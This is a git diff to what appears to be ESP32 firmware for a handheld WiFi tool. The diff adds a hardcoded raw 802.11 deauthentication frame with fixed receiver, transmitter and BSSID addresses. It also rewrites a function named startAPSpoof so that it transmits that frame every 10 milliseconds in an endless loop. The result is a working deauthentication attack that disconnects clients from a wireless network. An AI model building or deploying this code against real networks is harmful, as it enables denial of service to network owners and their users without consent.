@@ -18,10 +18,8 @@
 
 /*
     TODO:
-    Store AP config so it can be configured and initialized seperatly
-    Implement client select
-    Change mac to chosen bssid
-    Implement deauth functionality
+    espressifs function does not support transmitting deauth frames, going to try manual sockets
+    https://stackoverflow.com/questions/21411851/how-to-send-data-over-a-raw-ethernet-socket-using-sendto-without-using-sockaddr
 */
 
 //configure AP
@@ -53,6 +51,17 @@ wifi_promiscuous_filter_t filter;
 uint8_t deauthClients[50][6]; //Store client mac addresses
 int numDeauthClients = 0;
 int selectedApNum = -1; //If value is -1, an ap has not been selected
+
+//raw deauth packet
+uint8_t rawDeauthFrame[] = {
+    0xc0, 0x00, //frame control
+    0x34, 0x00, //duration. How long ap waits for ack?
+    0x00, 0x20, 0xa6, 0xfc, 0xb0, 0x36, //reciever address
+    0x2c, 0xf8, 0x9b, 0xdd, 0x06, 0xa0, //transmitter address
+    0x2c, 0xf8, 0x9b, 0xdd, 0x06, 0xa0, //bssid
+    0x00, 0x00 //sequence number
+};
+
 
 void configStyle() {
     lv_style_init(&clock_obj_style);
@@ -417,8 +426,15 @@ void selectAllDeauthClients() {
 
 void startAPSpoof() {
     esp_wifi_start();
+    //esp_wifi_deauth_sta(0);
+    const void *buffer = &rawDeauthFrame;
+    int bufferLen = sizeof(rawDeauthFrame)/sizeof(rawDeauthFrame[0]);
 
-    //esp_wifi_80211_tx();
+    Serial.println("Startung deauth test");
+    while(true) {
+        esp_wifi_80211_tx(WIFI_IF_AP, buffer, bufferLen, false);
+        delay(10);
+    }
 }
 
 
